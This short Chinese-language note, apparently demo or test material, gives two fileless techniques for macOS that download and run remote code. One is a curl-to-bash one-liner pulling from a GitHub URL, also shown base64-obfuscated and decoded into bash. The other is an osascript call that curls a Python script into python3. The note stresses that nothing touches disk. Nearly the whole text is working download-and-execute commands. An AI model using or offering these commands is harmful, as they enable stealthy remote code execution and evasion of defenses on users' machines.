1、运行base64编码后的命令，从远端下载恶意脚本并执行
curl -s https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250709/harmless_applescript_demo.script | nohup bash

Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veXEwMC9hbXBfdGVzdF9kZW1vL3JlZnMvaGVhZHMvbWFpbi8yNTA3MDkvaGFybWxlc3NfYXBwbGVzY3JpcHRfZGVtby5zY3JpcHQgfCBub2h1cCBiYXNo

echo "Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veXEwMC9hbXBfdGVzdF9kZW1vL3JlZnMvaGVhZHMvbWFpbi8yNTA3MDkvaGFybWxlc3NfYXBwbGVzY3JpcHRfZGVtby5zY3JpcHQgfCBub2h1cCBiYXNo" |base64 -d|bash


2、osascript 直接跑命令下载python脚本运行
osascript -e 'do shell script "nohup curl -s https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250709/asset.py | python3 -" '

整个流程不落盘，直接执行

